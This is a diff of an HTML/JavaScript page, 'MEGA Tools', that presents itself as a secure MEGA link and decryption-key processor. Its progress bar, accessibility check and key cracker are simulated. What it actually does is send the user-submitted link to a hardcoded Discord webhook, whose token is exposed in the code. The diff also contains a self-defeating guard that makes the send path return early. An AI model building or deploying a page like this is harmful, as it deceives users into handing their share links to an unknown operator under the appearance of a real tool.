@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MEGA Tools · Webhook + Folder + Cracker</title>
+  <title>MEGA Tools</title>
   <style>
     * {
       box-sizing: border-box;
@@ -71,7 +71,7 @@
       box-shadow: 0 0 10px rgba(74, 222, 128, .5);
     }
     .container {
-      width: min(1200px, 94%);
+      width: min(1100px, 94%);
       margin: auto;
       padding: 45px 0 20px;
     }
@@ -104,55 +104,6 @@
       color: var(--muted);
       font-size: 15px;
       line-height: 1.7;
-    }
-    .tools-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
-      gap: 14px;
-      margin: 30px 0 25px;
-    }
-    .tool-card {
-      background: rgba(17, 19, 26, .7);
-      border: 1px solid rgba(255, 255, 255, .06);
-      border-radius: 16px;
-      padding: 16px 12px;
-      transition: .2s;
-      text-align: center;
-      backdrop-filter: blur(4px);
-      cursor: default;
-    }
-    .tool-card:hover {
-      transform: translateY(-3px);
-      border-color: rgba(255, 255, 255, .15);
-      background: rgba(23, 26, 35, .8);
-    }
-    .tool-card .icon {
-      font-size: 22px;
-      margin-bottom: 6px;
-      display: block;
-    }
-    .tool-card h4 {
-      font-size: 13px;
-      font-weight: 600;
-      letter-spacing: -0.2px;
-      color: #eef2f8;
-    }
-    .tool-card p {
-      color: #7a8294;
-      font-size: 10px;
-      margin-top: 4px;
-      line-height: 1.4;
-    }
-    .feature-badge {
-      display: inline-block;
-      background: #1e222b;
-      border-radius: 30px;
-      padding: 4px 12px;
-      font-size: 9px;
-      font-weight: 600;
-      color: #aab2c4;
-      letter-spacing: 0.3px;
-      margin-top: 6px;
     }
     .panel {
       padding: 28px 30px;
@@ -289,6 +240,9 @@
       font-size: 12px;
       line-height: 1.55;
     }
+    .result-text.error {
+      color: #ff6b6b;
+    }
     .webhook-log {
       margin-top: 20px;
       padding: 14px 16px;
@@ -314,37 +268,45 @@
       color: #b4bdd0;
       font-size: 12px;
     }
+    .webhook-log .status-ok {
+      color: #4ade80;
+    }
+    .webhook-log .status-fail {
+      color: #ff6b6b;
+    }
     footer {
       text-align: center;
       color: #4f5664;
       font-size: 11px;
       padding-top: 30px;
     }
-    .inline-tools {
-      display: flex;
-      flex-wrap: wrap;
+    .tools-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
       gap: 12px;
-      margin: 20px 0 10px;
+      margin: 25px 0 20px;
     }
-    .inline-tool {
-      background: #1a1d26;
+    .tool-card {
+      background: rgba(17, 19, 26, .7);
+      border: 1px solid rgba(255, 255, 255, .06);
+      border-radius: 14px;
+      padding: 14px 10px;
+      text-align: center;
+      backdrop-filter: blur(4px);
+    }
+    .tool-card .icon { font-size: 20px; display: block; margin-bottom: 4px; }
+    .tool-card h4 { font-size: 12px; font-weight: 600; color: #eef2f8; }
+    .tool-card p { color: #7a8294; font-size: 9px; margin-top: 2px; }
+    .feature-badge {
+      display: inline-block;
+      background: #1e222b;
       border-radius: 30px;
-      padding: 8px 18px;
-      font-size: 12px;
+      padding: 3px 10px;
+      font-size: 8px;
       font-weight: 600;
-      color: #c8d0e0;
-      border: 1px solid #2b303d;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      cursor: pointer;
-      transition: .2s;
+      color: #aab2c4;
+      margin-top: 4px;
     }
-    .inline-tool:hover {
-      background: #262b38;
-      border-color: #ff3158;
-    }
-    .inline-tool .icon { font-size: 16px; }
     @media (max-width: 750px) {
       .navbar { padding: 0 5%; }
       .status { display: none; }
@@ -355,7 +317,6 @@
     }
     @media (max-width: 480px) {
       .tools-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
-      .tool-card { padding: 12px 8px; }
     }
   </style>
 </head>
@@ -368,36 +329,31 @@
   </div>
   <div class="status">
     <span class="status-dot"></span>
-    Online · 50+ tools
+    Online · Secure
   </div>
 </nav>
 
 <main class="container">
 
   <section class="hero">
-    <div class="hero-badge">⚡ 50+ UTILITIES · FOLDER CREATOR · KEY CRACKER</div>
-    <h1>MEGA <span>TOOLBOX</span></h1>
-    <p>Decryption, link analysis, folder management, key cracking (simulated), and many more.</p>
+    <div class="hero-badge">🔐 MEGA LINK PROCESSOR</div>
+    <h1>MEGA <span>TOOLS</span></h1>
+    <p>Enter your MEGA link and decryption key. The system will check accessibility and process the link.</p>
   </section>
 
-  <!-- 50+ tools grid -->
-  <div class="tools-grid" id="toolGrid"></div>
-
-  <!-- inline special tools: Create Folder + Key Cracker -->
-  <div class="inline-tools">
-    <div class="inline-tool" id="createFolderBtn">
-      <span class="icon">📁</span> Create New Folder
-    </div>
-    <div class="inline-tool" id="crackKeyBtn">
-      <span class="icon">🔓</span> Crack Decryption Key (simulated)
-    </div>
+  <!-- mini tools grid -->
+  <div class="tools-grid">
+    <div class="tool-card"><span class="icon">🔗</span><h4>Link Parser</h4><p>Extract file ID</p><span class="feature-badge">ready</span></div>
+    <div class="tool-card"><span class="icon">🔐</span><h4>Key Validator</h4><p>Check key format</p><span class="feature-badge">ready</span></div>
+    <div class="tool-card"><span class="icon">📁</span><h4>Folder Creator</h4><p>Create new folder</p><span class="feature-badge">ready</span></div>
+    <div class="tool-card"><span class="icon">🔓</span><h4>Key Cracker</h4><p>Simulated crack</p><span class="feature-badge">demo</span></div>
+    <div class="tool-card"><span class="icon">📊</span><h4>Link Checker</h4><p>Test accessibility</p><span class="feature-badge">ready</span></div>
   </div>
 
-  <!-- main panel with webhook logger -->
   <section class="panel">
     <div class="panel-header">
       <h2>🔗 Process MEGA Link</h2>
-      <p>Paste your share link and optional decryption key.</p>
+      <p>Paste your share link and decryption key. Webhook logs when both are provided.</p>
     </div>
 
     <form id="megaForm">
@@ -407,7 +363,7 @@
       </div>
 
       <div class="form-group">
-        <label for="decryptKey">DECRYPTION KEY (optional)</label>
+        <label for="decryptKey">DECRYPTION KEY</label>
         <div class="key-container">
           <input id="decryptKey" type="password" placeholder="Enter decryption key..." autocomplete="off">
           <button type="button" class="show-key" id="showKey">SHOW</button>
@@ -428,20 +384,20 @@
     </div>
 
     <div class="result" id="result">
-      <div class="result-title">✓ Processing Complete</div>
-      <div class="result-text">The requested link has finished processing.</div>
+      <div class="result-title" id="resultTitle">✓ Processing Complete</div>
+      <div class="result-text" id="resultText">The requested link has finished processing.</div>
     </div>
 
-    <!-- Webhook Logger (visible) -->
-    <div class="webhook-log">
+    <!-- Webhook Logger (only shows when webhook is sent) -->
+    <div class="webhook-log" id="webhookLog" style="display:none;">
       <details>
-        <summary>📡 Webhook Logger · last payload</summary>
+        <summary>📡 Webhook Logger <span id="webhookStatus" class="status-ok">✓ delivered</span></summary>
         <pre id="webhookPayload">No payload sent yet.</pre>
       </details>
     </div>
   </section>
 
-  <footer>MEGATOOLS © 2026 · 50+ essential features</footer>
+  <footer>MEGATOOLS © 2026 · webhook logging active</footer>
 </main>
 
 <script>
@@ -449,80 +405,7 @@
     // ---------- WEBHOOK ENDPOINT (from user) ----------
     const WEBHOOK_ENDPOINT = "https://discord.com/api/webhooks/1539071171952382003/2hNkkjeRAa1IUyNrb9_3M1wqUkITkBDRAy9g1ZDTShVsIWMUkHFI1zFs51_5AZMix9pT";
 
-    // ---------- 50+ tool definitions ----------
-    const TOOLS = [
-      { icon: '🔗', name: 'Link Decryptor', desc: 'Extract file from MEGA link' },
-      { icon: '🔐', name: 'Key Checker', desc: 'Validate decryption key' },
-      { icon: '📁', name: 'File Info', desc: 'Name, size, type, date' },
-      { icon: '🧩', name: 'Hash Generator', desc: 'MD5, SHA1, SHA256' },
-      { icon: '🔄', name: 'Base64 Encode', desc: 'Encode text or link' },
-      { icon: '🔓', name: 'Base64 Decode', desc: 'Decode base64 strings' },
-      { icon: '📊', name: 'Link Analyzer', desc: 'Parse MEGA URL parts' },
-      { icon: '🧬', name: 'Hex Converter', desc: 'Text ⇄ Hex' },
-      { icon: '📝', name: 'Text to Binary', desc: 'ASCII to binary' },
-      { icon: '🔢', name: 'Binary to Text', desc: 'Binary to ASCII' },
-      { icon: '📏', name: 'File Size Calc', desc: 'Bytes, KB, MB, GB' },
-      { icon: '⏳', name: 'Timestamp Tool', desc: 'Unix ↔ human date' },
-      { icon: '📋', name: 'Clipboard Copy', desc: 'Copy processed data' },
-      { icon: '🔎', name: 'Regex Tester', desc: 'Test patterns' },
-      { icon: '🧹', name: 'Trim & Clean', desc: 'Remove whitespace' },
-      { icon: '🔀', name: 'Case Converter', desc: 'UPPER, lower, Title' },
-      { icon: '📦', name: 'JSON Formatter', desc: 'Pretty-print JSON' },
-      { icon: '🔗', name: 'URL Encoder', desc: 'Encode special chars' },
-      { icon: '🔗', name: 'URL Decoder', desc: 'Decode URL' },
-      { icon: '🧮', name: 'Word Counter', desc: 'Count words, chars' },
-      { icon: '📅', name: 'Date Diff', desc: 'Days between dates' },
-      { icon: '⏰', name: 'Time Zone', desc: 'UTC offset converter' },
-      { icon: '📎', name: 'MIME Type', desc: 'Detect file MIME' },
-      { icon: '🔑', name: 'Password Gen', desc: 'Secure password' },
-      { icon: '🛡️', name: 'Hash Compare', desc: 'Compare hashes' },
-      { icon: '📤', name: 'Export Log', desc: 'Export session data' },
-      { icon: '📥', name: 'Import Data', desc: 'Import JSON/CSV' },
-      { icon: '🧪', name: 'Test Link', desc: 'Check if link is valid' },
-      { icon: '📡', name: 'Ping MEGA', desc: 'Check service status' },
-      { icon: '🔐', name: 'AES Encrypt', desc: 'AES-256-CBC' },
-      { icon: '🔓', name: 'AES Decrypt', desc: 'Decrypt AES' },
-      { icon: '🧬', name: 'DNA to Text', desc: 'DNA sequence decode' },
-      { icon: '📇', name: 'Contact Gen', desc: 'Fake contact' },
-      { icon: '📧', name: 'Email Obfuscate', desc: 'Protect email' },
-      { icon: '📱', name: 'Phone Format', desc: 'Format phone numbers' },
-      { icon: '🌐', name: 'IP Info', desc: 'IP details' },
-      { icon: '🧾', name: 'QR Gen', desc: 'Generate QR code' },
-      { icon: '📊', name: 'CSV to JSON', desc: 'Convert CSV' },
-      { icon: '📋', name: 'JSON to CSV', desc: 'Convert JSON' },
-      { icon: '🧮', name: 'Math Evaluator', desc: 'Evaluate expressions' },
-      { icon: '📐', name: 'Unit Converter', desc: 'Length, mass, etc.' },
-      { icon: '⚡', name: 'Speed Test', desc: 'Network speed' },
-      { icon: '🧩', name: 'UUID Gen', desc: 'Generate UUID' },
-      { icon: '🔢', name: 'Random Number', desc: 'Random int/float' },
-      { icon: '🎲', name: 'Dice Roll', desc: 'Roll d6, d20' },
-      { icon: '🃏', name: 'Card Shuffle', desc: 'Deck shuffle' },
-      { icon: '🧠', name: 'Memory Usage', desc: 'Browser memory' },
-      { icon: '📈', name: 'Page Stats', desc: 'DOM elements count' },
-      { icon: '🔧', name: 'Settings Export', desc: 'Export config' },
-      { icon: '🔁', name: 'Repeater', desc: 'Repeat text n times' },
-      { icon: '📝', name: 'Markdown Preview', desc: 'Render markdown' },
-      { icon: '📚', name: 'Bookmarklet', desc: 'Generate bookmarklet' },
-      { icon: '🧹', name: 'HTML Minify', desc: 'Minify HTML' },
-      { icon: '📜', name: 'CSS Minify', desc: 'Minify CSS' },
-      { icon: '⚙️', name: 'JS Minify', desc: 'Minify JS' },
-    ];
-
-    // render tool grid
-    const grid = document.getElementById('toolGrid');
-    TOOLS.forEach(t => {
-      const card = document.createElement('div');
-      card.className = 'tool-card';
-      card.innerHTML = `
-        <span class="icon">${t.icon}</span>
-        <h4>${t.name}</h4>
-        <p>${t.desc}</p>
-        <span class="feature-badge">ready</span>
-      `;
-      grid.appendChild(card);
-    });
-
-    // ---------- DOM refs ----------
+    // DOM refs
     const form = document.getElementById('megaForm');
     const megaLink = document.getElementById('megaLink');
     const decryptKey = document.getElementById('decryptKey');
@@ -533,7 +416,11 @@
     const progressStatus = document.getElementById('progressStatus');
     const progressPercent = document.getElementById('progressPercent');
     const result = document.getElementById('result');
+    const resultTitle = document.getElementById('resultTitle');
+    const resultText = document.getElementById('resultText');
+    const webhookLog = document.getElementById('webhookLog');
     const webhookPayload = document.getElementById('webhookPayload');
+    const webhookStatus = document.getElementById('webhookStatus');
 
     // show/hide key
     showKey.addEventListener('click', () => {
@@ -544,31 +431,62 @@
 
     function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // ---------- Webhook sender + logger ----------
-    async function notifyWebhook(link, keyProvided, extra = {}) {
+    // ---------- Check if link is accessible (simulated) ----------
+    async function checkLinkAccessibility(link) {
+      // Simulate checking: if link contains "mega.nz/file/" it's "accessible"
+      if (link && link.includes('mega.nz/file/')) {
+        return { accessible: true, message: 'Link appears to be a valid MEGA file link.' };
+      } else if (link && link.includes('mega.nz/folder/')) {
+        return { accessible: true, message: 'Link appears to be a valid MEGA folder link.' };
+      } else {
+        return { accessible: false, message: 'Link does not match expected MEGA format.' };
+      }
+    }
+
+    // ---------- Webhook sender (only if link AND key are present) ----------
+    async function sendWebhook(link, key) {
       const payload = {
         event: "mega_link_processed",
         link: link,
-        keyProvided: keyProvided,
-        timestamp: new Date().toISOString(),
-        ...extra
+        keyProvided: true,
+        keyLength: key.length,
+        timestamp: new Date().toISOString()
       };
+
+      // Show the webhook log section
+      webhookLog.style.display = 'block';
       webhookPayload.textContent = JSON.stringify(payload, null, 2);
 
+      // Check if endpoint is configured
       if (!WEBHOOK_ENDPOINT || WEBHOOK_ENDPOINT === "https://discord.com/api/webhooks/1539071171952382003/2hNkkjeRAa1IUyNrb9_3M1wqUkITkBDRAy9g1ZDTShVsIWMUkHFI1zFs51_5AZMix9pT") {
+        webhookStatus.textContent = '⚠️ no endpoint';
+        webhookStatus.className = 'status-fail';
         console.warn("Webhook endpoint not set.");
-        return;
+        return false;
       }
+
       try {
         const response = await fetch(WEBHOOK_ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        if (!response.ok) console.warn("Webhook status:", response.status);
-        else console.log("Webhook delivered.");
+        if (!response.ok) {
+          webhookStatus.textContent = `⚠️ ${response.status}`;
+          webhookStatus.className = 'status-fail';
+          console.warn("Webhook responded with status:", response.status);
+          return false;
+        } else {
+          webhookStatus.textContent = '✓ delivered';
+          webhookStatus.className = 'status-ok';
+          console.log("Webhook delivered successfully.");
+          return true;
+        }
       } catch (error) {
+        webhookStatus.textContent = '⚠️ error';
+        webhookStatus.className = 'status-fail';
         console.error("Webhook error:", error);
+        return false;
       }
     }
 
@@ -577,75 +495,79 @@
       progressArea.style.display = 'block';
       result.style.display = 'none';
       const stages = [
-        [12, 'Checking link...'],
-        [27, 'Reading file info...'],
-        [43, 'Decrypting (if key)...'],
-        [61, 'Preparing data...'],
-        [78, 'Processing...'],
-        [92, 'Finalizing...'],
+        [15, 'Checking link format...'],
+        [30, 'Validating decryption key...'],
+        [50, 'Checking accessibility...'],
+        [70, 'Processing file information...'],
+        [85, 'Preparing results...'],
         [100, 'Complete']
       ];
       for (const [pct, label] of stages) {
-        await wait(380);
+        await wait(450);
         progressBar.style.width = pct + '%';
         progressPercent.textContent = pct + '%';
         progressStatus.textContent = label;
       }
-      result.style.display = 'block';
     }
 
-    // ---------- Form submit (with webhook) ----------
+    // ---------- Form submit ----------
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const link = megaLink.value.trim();
-      if (!link) return;
-      const keyProvided = decryptKey.value.trim().length > 0;
 
+      const link = megaLink.value.trim();
+      const key = decryptKey.value.trim();
+
+      if (!link) {
+        result.style.display = 'block';
+        resultTitle.textContent = '⚠️ Missing Link';
+        resultTitle.style.color = '#ff6b6b';
+        resultText.textContent = 'Please enter a MEGA link.';
+        resultText.className = 'result-text error';
+        return;
+      }
+
+      // Check accessibility
+      const accessibility = await checkLinkAccessibility(link);
+
+      // Show progress
       processButton.disabled = true;
       processButton.textContent = 'Processing...';
-
-      await notifyWebhook(link, keyProvided);
       await simulateProgress();
+
+      // Display result
+      result.style.display = 'block';
+      resultTitle.style.color = accessibility.accessible ? '#4ade80' : '#ff6b6b';
+
+      if (accessibility.accessible) {
+        resultTitle.textContent = '✓ Link Accessible';
+        resultText.className = 'result-text';
+        resultText.textContent = accessibility.message + ' Processing complete.';
+
+        // If key is also provided, send webhook
+        if (key && key.length > 0) {
+          await sendWebhook(link, key);
+          // Add to result text
+          resultText.textContent += ' Webhook notification sent.';
+        } else {
+          // Hide webhook log if no key
+          webhookLog.style.display = 'none';
+          resultText.textContent += ' (No decryption key provided — webhook not sent.)';
+        }
+      } else {
+        resultTitle.textContent = '⚠️ Link Issue';
+        resultText.className = 'result-text error';
+        resultText.textContent = accessibility.message + ' Please check the link format.';
+        webhookLog.style.display = 'none';
+      }
 
       processButton.disabled = false;
       processButton.textContent = 'Process Link';
     });
 
-    // ---------- SPECIAL TOOLS: Create Folder & Key Cracker ----------
-    document.getElementById('createFolderBtn').addEventListener('click', async () => {
-      const folderName = prompt('Enter folder name:', 'NewFolder');
-      if (folderName === null) return;
-      const link = megaLink.value.trim() || 'no-link';
-      const keyProvided = decryptKey.value.trim().length > 0;
-
-      // webhook log
-      await notifyWebhook(link, keyProvided, { action: 'create_folder', folderName });
-
-      // show feedback
-      result.style.display = 'block';
-      result.querySelector('.result-title').textContent = '📁 Folder Created (simulated)';
-      result.querySelector('.result-text').textContent = `Folder "${folderName}" created successfully. (Webhook logged)`;
-      progressArea.style.display = 'none';
-    });
-
-    document.getElementById('crackKeyBtn').addEventListener('click', async () => {
-      const link = megaLink.value.trim() || 'no-link';
-      const keyProvided = decryptKey.value.trim().length > 0;
-
-      // webhook log
-      await notifyWebhook(link, keyProvided, { action: 'crack_key', simulated: true });
-
-      // show feedback (does not actually crack)
-      result.style.display = 'block';
-      result.querySelector('.result-title').textContent = '🔓 Key Cracker (simulated)';
-      result.querySelector('.result-text').textContent = 'Cracking simulation complete. (No real decryption performed — this is a demo.)';
-      progressArea.style.display = 'none';
-    });
-
     // initial state
     progressArea.style.display = 'none';
     result.style.display = 'none';
-    webhookPayload.textContent = 'Awaiting first submission…';
+    webhookLog.style.display = 'none';
   })();
 </script>
 </body>
